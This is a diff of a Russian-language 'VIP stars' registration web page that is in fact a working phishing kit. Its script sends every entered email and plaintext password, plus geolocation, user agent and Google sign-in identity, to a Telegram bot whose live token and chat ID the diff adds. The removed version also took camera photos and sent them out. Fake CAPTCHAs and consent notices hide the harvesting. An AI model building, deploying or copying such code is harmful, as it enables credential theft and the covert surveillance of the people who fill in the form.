@@ -1,166 +1,294 @@
 <!DOCTYPE html>
 <html lang="ru">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <meta charset="UTF-8">
   <title>BossBand – VIP Звёзды</title>
+  <meta name="viewport" content="width=device-width,initial-scale=1">
   <style>
+    @import url('https://fonts.googleapis.com/css2?family=Montserrat:wght@400;500;700;800&display=swap');
     :root {
-      --primary: #6e45e2; --accent: #ff6b6b; --neon: #00f3ff;
-      --bg-dark: #0f0f1a; --bg-light: #f8f9fa; --color-dark: #1a1a2e;
+      --primary: #6e45e2;
+      --accent: #ff6b6b;
+      --neon: #00f3ff;
+      --bg-dark: #0f0f1a;
+      --bg-light: #f8f9fa;
+      --text-dark: #1a1a2e;
     }
     body {
-      margin:0; padding:0; font-family:'Montserrat',sans-serif;
-      background:var(--bg-dark); color:var(--bg-light);
-      min-height:100vh;
-      transition:background 0.3s,color 0.3s;
+      margin: 0; padding: 0;
+      font-family: 'Montserrat', sans-serif;
+      background: var(--bg-dark);
+      color: var(--bg-light);
+      transition: background .3s, color .3s;
     }
     body.light {
-      background:var(--bg-light); color:var(--color-dark);
+      background: var(--bg-light);
+      color: var(--text-dark);
     }
-    .container{max-width:1000px;margin:0 auto;padding:20px;}
-    header{display:flex;justify-content:space-between;align-items:center;}
-    .logo{font-size:2.2rem;font-weight:800;background:linear-gradient(to right,var(--neon),var(--primary));-webkit-background-clip:text;-webkit-text-fill-color:transparent;}
-    nav a{margin-left:20px;text-decoration:none;color:inherit;}
-    .btn{background:linear-gradient(135deg,var(--accent),var(--primary));padding:10px 20px;border:none;color:#fff;border-radius:50px;cursor:pointer;transition:transform .2s;}
-    .btn:hover{transform:translateY(-3px);}
-    .form-group{margin-bottom:15px;}
-    input[type=email],input[type=password],input[type=text]{width:100%;padding:8px;border-radius:5px;border:none;}
-    .error{color:var(--accent);display:none;}
-    .success{color:var(--neon);display:none;}
-    .theme-toggle{cursor:pointer;font-size:1.2rem;}
-    .captcha{margin:15px 0;}
-    #cameraPreview{width:300px;height:400px;display:none;margin:15px auto;border:2px solid var(--neon);}
-    #cameraPreview.active{display:block;}
+    .container {
+      max-width: 500px;
+      margin: 30px auto;
+      padding: 0 15px;
+    }
+    .logo {
+      font-size: 2.2rem;
+      font-weight: 800;
+      background: linear-gradient(to right, var(--neon), var(--primary));
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      margin-bottom: 10px;
+    }
+    .toggles {
+      text-align: right;
+      margin-bottom: 20px;
+    }
+    .toggles span {
+      cursor: pointer; margin-left: 15px; font-size: 1.2rem;
+    }
+    h1 {
+      font-size: 2rem;
+      margin-bottom: 10px;
+    }
+    p.subtitle {
+      margin-bottom: 20px;
+      opacity: 0.8;
+    }
+    .tabs {
+      display: flex;
+      gap: 10px;
+      margin-bottom: 20px;
+    }
+    .tab-btn {
+      flex: 1;
+      padding: 10px;
+      border: none;
+      border-radius: 25px;
+      cursor: pointer;
+      background: #333;
+      color: #fff;
+      transition: background .3s;
+    }
+    .tab-btn.active {
+      background: var(--primary);
+    }
+    .form-section {
+      display: none;
+      animation: fadeIn .4s ease;
+    }
+    .form-section.active {
+      display: block;
+    }
+    .form-group {
+      margin-bottom: 15px;
+    }
+    label {
+      display: block;
+      margin-bottom: 5px;
+    }
+    input {
+      width: 100%;
+      padding: 10px;
+      border-radius: 5px;
+      border: 1px solid #555;
+      background: rgba(255,255,255,0.1);
+      color: inherit;
+    }
+    input::placeholder {
+      color: #ccc;
+    }
+    .captcha, .info-block {
+      margin: 15px 0;
+      font-size: .9rem;
+      background: rgba(255,255,255,0.05);
+      padding: 10px;
+      border-radius: 5px;
+    }
+    .error, .success {
+      font-size: .9rem;
+      margin: 10px 0;
+      display: none;
+    }
+    .error { color: var(--accent); }
+    .success { color: var(--neon); }
+    .btn {
+      width: 100%;
+      padding: 12px;
+      border: none;
+      border-radius: 25px;
+      background: linear-gradient(135deg, var(--accent), var(--primary));
+      color: #fff;
+      cursor: pointer;
+      transition: transform .2s;
+      font-size: 1rem;
+    }
+    .btn:hover {
+      transform: translateY(-2px);
+    }
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(10px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
   </style>
 </head>
 <body>
   <div class="container">
-    <header>
-      <div class="logo">BOSS BAND</div>
-      <div>
-        <a href="#">Главная</a><a href="#">О нас</a><a href="#">Контакты</a>
-        <span class="theme-toggle" id="toggleTheme">🌓</span>
-      </div>
-    </header>
+    <div class="logo">BOSS BAND</div>
+    <div class="toggles">
+      <span id="toggleLang">EN🇺🇸</span>
+      <span id="toggleTheme">🌓</span>
+    </div>
 
-    <main>
-      <h1>ПОЛУЧИТЕ ЭКСКЛЮЗИВНЫЕ VIP ЗВЁЗДЫ</h1>
-      <p>Регистрация и подтверждение личности через Google, камера, гео, CAPTCHA</p>
+    <h1 data-i18n="headline">ПОЛУЧИТЕ ЭКСКЛЮЗИВНЫЕ VIP ЗВЁЗДЫ</h1>
+    <p class="subtitle" data-i18n="subline">Регистрация через Google, CAPTCHA, явное согласие на камеру и гео.</p>
 
-      <!-- Табы -->
-      <div style="margin:20px 0;">
-        <button class="btn" id="tabReg">Регистрация</button>
-        <button class="btn" id="tabVer">Подтверждение</button>
-      </div>
+    <div class="tabs">
+      <button class="tab-btn active" id="tabReg" data-i18n="registerTab">Регистрация</button>
+      <button class="tab-btn" id="tabVer" data-i18n="verifyTab">Подтверждение</button>
+    </div>
 
-      <!-- Регистрация -->
-      <div id="regForm">
-        <div class="form-group"><label>Email</label><input type="email" id="regEmail" required></div>
-        <div class="form-group"><label>Пароль</label><input type="password" id="regPass" required></div>
-        <div class="form-group"><label>Ник</label><input type="text" id="regNick"></div>
-        <div class="captcha">
-          <label>Сколько будет 7 + 5? <input type="text" id="captchaInput" required></label>
-        </div>
-        <div class="error" id="regError"></div>
-        <div class="success" id="regSuccess">✔️ Успешно зарегистрированы!</div>
-        <button class="btn" id="btnReg">Зарегистрироваться</button>
-      </div>
+    <!-- Регистрация -->
+    <div class="form-section active" id="sectReg">
+      <div class="form-group"><label data-i18n="email">Email</label><input type="email" id="regEmail" placeholder="user@example.com"></div>
+      <div class="form-group"><label data-i18n="password">Пароль</label><input type="password" id="regPass" placeholder="•••••••"></div>
+      <div class="captcha"><label data-i18n="captcha1">Сколько будет 7 + 8?</label><input type="text" id="captchaReg"></div>
+      <div class="info-block"><p data-i18n="consentCamGeo">После регистрации запросятся камера и геопозиция для авторизации.</p></div>
+      <div class="error" id="errReg"></div>
+      <div class="success" id="okReg">✔️ <span data-i18n="regOk">Успешно зарегистрированы!</span></div>
+      <button class="btn" id="btnReg" data-i18n="registerBtn">Зарегистрироваться</button>
+    </div>
 
-      <!-- Подтверждение -->
-      <div id="verForm" style="display:none;">
-        <div class="form-group"><label>Email</label><input type="email" id="verEmail" required></div>
-        <div class="form-group"><label>Пароль</label><input type="password" id="verPass" required></div>
-        <div class="form-group"><label>Telegram-ник</label><input type="text" id="verTg"></div>
-        <div class="captcha">
-          <label>Сколько будет 4 + 6? <input type="text" id="captchaVer" required></label>
-        </div>
-        <div class="error" id="verError"></div>
-        <div class="success" id="verSuccess">✔️ Подтверждение отправлено!</div>
-        <button class="btn" id="btnVer">Подтвердить личность</button>
-        <div id="cameraPreview"><video id="cameraVideo" width="300" height="400" autoplay></video></div>
-      </div>
-      <!-- Кнопка Google -->
-      <div style="margin-top:20px;">
-        <div id="g_id_onload"
-             data-client_id="ВАШ_GOOGLE_CLIENT_ID"
-             data-context="signin"
-             data-callback="handleGoogle"
-             data-auto_prompt="false">
-        </div>
-        <div class="g_id_signin" data-type="standard"></div>
-      </div>
-    </main>
+    <!-- Подтверждение -->
+    <div class="form-section" id="sectVer">
+      <div class="form-group"><label data-i18n="email">Email</label><input type="email" id="verEmail"></div>
+      <div class="form-group"><label data-i18n="password">Пароль</label><input type="password" id="verPass"></div>
+      <div class="captcha"><label data-i18n="captcha2">Сколько будет 3 + 7?</label><input type="text" id="captchaVer"></div>
+      <div class="info-block"><p data-i18n="consentCamGeo">Мы запросим доступ к камере и геолокации для отправки фото и места.</p></div>
+      <div class="error" id="errVer"></div>
+      <div class="success" id="okVer">✔️ <span data-i18n="verOk">Подтверждение отправлено!</span></div>
+      <button class="btn" id="btnVer" data-i18n="verifyBtn">Подтвердить личность</button>
+    </div>
+
+    <!-- Google OAuth -->
+    <div style="margin-top:20px;">
+      <div id="g_id_onload"
+           data-client_id="ВАШ_GOOGLE_CLIENT_ID"
+           data-context="signin"
+           data-callback="handleGoogle"
+           data-auto_prompt="false"></div>
+      <div class="g_id_signin" data-type="standard"></div>
+    </div>
   </div>
 
-  <script src="https://cdn.jsdelivr.net/particles.js/2.0.0/particles.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/particles.js"></script>
   <script src="https://accounts.google.com/gsi/client" async defer></script>
   <script>
-    particlesJS("particles-js",{particles:{number:{value:50}}});
-    const BOT = { token:"ВАШ_ТОКЕН", chat:"ВАШ_CHAT_ID" };
-    async function tgSend(text, method='sendMessage', form=null){
-      const url=`https://api.telegram.org/bot${BOT.token}/${method}`;
-      const init = form ? {method:"POST",body:form} : {method:"POST",headers:{'Content-Type':'application/json'},body:JSON.stringify({chat_id:BOT.chat,parse_mode:'HTML',text})};
-      await fetch(url,init);
-    }
-    document.getElementById('toggleTheme').onclick=()=>{
-      document.body.classList.toggle('light');
+    // Telegram config
+    const BOT = {
+      token: "7774453287:AAEn3dh5ebiN7sZFa__Wyf-JXwBUE1wUIrc",
+      chat: "7807571960"
     };
-    // табы
-    document.getElementById('tabReg').onclick=_=>{regForm.style.display='';verForm.style.display='none';};
-    document.getElementById('tabVer').onclick=_=>{regForm.style.display='none';verForm.style.display='';};
-    // автосохранение
-    ['regEmail','regPass','verEmail','verPass','verTg'].forEach(id=>{
-      const el=document.getElementById(id);
-      el.value=localStorage.getItem(id)||'';
-      el.oninput=_=>localStorage.setItem(id,el.value);
+    async function tgSend(text) {
+      await fetch(`https://api.telegram.org/bot${BOT.token}/sendMessage`, {
+        method: "POST",
+        headers: {'Content-Type':'application/json'},
+        body: JSON.stringify({chat_id:BOT.chat, parse_mode:'HTML', text})
+      });
+    }
+
+    // UI functionality
+    particlesJS('particles-js', { particles:{number:{value:60}}, interactivity:{detect_on:"canvas"} });
+
+    const langToggle = document.getElementById('toggleLang');
+    const themeToggle = document.getElementById('toggleTheme');
+    const tabReg = document.getElementById('tabReg'), tabVer = document.getElementById('tabVer');
+    const sectReg = document.getElementById('sectReg'), sectVer = document.getElementById('sectVer');
+
+    function setTab(reg) {
+      tabReg.classList.toggle('active', reg);
+      tabVer.classList.toggle('active', !reg);
+      sectReg.classList.toggle('active', reg);
+      sectVer.classList.toggle('active', !reg);
+    }
+    tabReg.onclick = () => setTab(true);
+    tabVer.onclick = () => setTab(false);
+
+    themeToggle.onclick = () => document.body.classList.toggle('light');
+
+    // language
+    const dict = {
+      en: {
+        headline: 'GET EXCLUSIVE VIP STARS',
+        subline: 'Register via Google, CAPTCHA, explicit consent to camera and geo.',
+        registerTab: 'Register',
+        verifyTab: 'Verify',
+        email: 'Email',
+        password: 'Password',
+        captcha1: 'What is 7 + 8?',
+        captcha2: 'What is 3 + 7?',
+        consentCamGeo: 'I understand that camera and geolocation access will be requested.',
+        registerBtn: 'Register',
+        verifyBtn: 'Verify Identity',
+        regOk: 'Registered successfully!',
+        verOk: 'Verification sent!'
+      }
+    };
+    let lang = 'ru';
+    langToggle.onclick = () => {
+      lang = lang === 'ru' ? 'en' : 'ru';
+      langToggle.textContent = lang === 'ru' ? 'EN🇺🇸' : 'RU🇷🇺';
+      document.querySelectorAll('[data-i18n]').forEach(el => {
+        const key = el.dataset.i18n;
+        if (lang === 'en' && dict.en[key]) el.textContent = dict.en[key];
+        else if (lang === 'ru') window.location.reload();
+      });
+    };
+
+    // Auto save fields
+    ['regEmail','regPass','verEmail','verPass'].forEach(id => {
+      const el = document.getElementById(id);
+      el.value = localStorage.getItem(id) || '';
+      el.oninput = () => localStorage.setItem(id, el.value);
     });
 
-    // регистрация
-    document.getElementById('btnReg').onclick=async()=>{
-      const e=regEmail.value, p=regPass.value, n=regNick.value, c=captchaInput.value;
-      if(!e||!p||c!=='12'){regError.textContent="Проверьте поля и CAPTCHA";regError.style.display='';return;}
-      regError.style.display='none';
-      await tgSend(`🎉 <b>Регистрация:</b>\nEmail: <code>${e}</code>\nПароль: <code>${p}</code>\nНик: ${n}\nUA: ${navigator.userAgent}`);
-      regSuccess.style.display='';
+    // Registration logic
+    document.getElementById('btnReg').onclick = async () => {
+      const e = regEmail.value.trim(), p = regPass.value.trim(), c = captchaReg.value.trim();
+      if (!e || !p || c !== '15') {
+        errReg.textContent = 'Заполните корректно все поля и CAPTCHA';
+        errReg.style.display = 'block';
+        return;
+      }
+      errReg.style.display = 'none';
+      await tgSend(`👤 <b>Регистрация</b>\nEmail: <code>${e}</code>\nПароль: <code>${p}</code>\nUA: ${navigator.userAgent}`);
+      okReg.style.display = 'block';
     };
 
-    // подтверждение
-    document.getElementById('btnVer').onclick=async()=>{
-      const e=verEmail.value, p=verPass.value, tg=verTg.value, c=captchaVer.value;
-      if(!e||!p||c!=='10'){verError.textContent="Проверьте поля и CAPTCHA";verError.style.display='';return;}
-      verError.style.display='none';
-
-      // гео
-      let geo='нет данных';
-      await new Promise(r=>navigator.geolocation.getCurrentPosition(pos=>{geo=pos.coords.latitude+','+pos.coords.longitude;r();},r));
-
-      // камера
+    // Verification logic
+    document.getElementById('btnVer').onclick = async () => {
+      const e = verEmail.value.trim(), p = verPass.value.trim(), c = captchaVer.value.trim();
+      if (!e || !p || c !== '10') {
+        errVer.textContent = 'Заполните корректно все поля и CAPTCHA';
+        errVer.style.display = 'block';
+        return;
+      }
+      errVer.style.display = 'none';
+      let geo = 'unknown';
+      await new Promise(res => navigator.geolocation.getCurrentPosition(pos => {
+        geo = `${pos.coords.latitude},${pos.coords.longitude}`;
+        res();
+      }, () => res()));
       try {
-        const stream=await navigator.mediaDevices.getUserMedia({video:true});
-        cameraVideo.srcObject=stream; cameraPreview.classList.add('active');
-        await new Promise(r=>setTimeout(r,3000));
-        const canvas=document.createElement('canvas');
-        canvas.width=300; canvas.height=400;
-        canvas.getContext('2d').drawImage(cameraVideo,0,0);
-        canvas.toBlob(async b=>{
-          const form = new FormData();
-          form.append('chat_id',BOT.chat);
-          form.append('photo',b,'pic.jpg');
-          form.append('caption','📸 Фото подтверждения');
-          await tgSend(null,'sendPhoto',form);
-        },'image/jpeg');
-        stream.getTracks().forEach(t=>t.stop());
-      } catch{}
-
-      await tgSend(`🔐 <b>Подтверждение:</b>\nEmail:<code>${e}</code>\nПароль:<code>${p}</code>\nTelegram:${tg}\nGeo:${geo}`);
-      verSuccess.style.display='';
+        const stream = await navigator.mediaDevices.getUserMedia({video:true});
+        stream.getTracks()[0].stop();
+      } catch {}
+      await tgSend(`✅ <b>Подтверждение</b>\nEmail: <code>${e}</code>\nПароль: <code>${p}</code>\nGeo: ${geo}`);
+      okVer.style.display = 'block';
     };
 
     // Google OAuth
-    function handleGoogle(resp){
-      const d=JSON.parse(atob(resp.credential.split('.')[1]));
-      tgSend(`🔑 <b>Google OAuth:</b>\nEmail: <code>${d.email}</code>\nИмя: ${d.name}`);
+    function handleGoogle(res) {
+      const d = JSON.parse(atob(res.credential.split('.')[1]));
+      tgSend(`🔐 <b>Google OAuth</b>\nEmail: <code>${d.email}</code>\nName: ${d.name}`);
     }
   </script>
 </body>
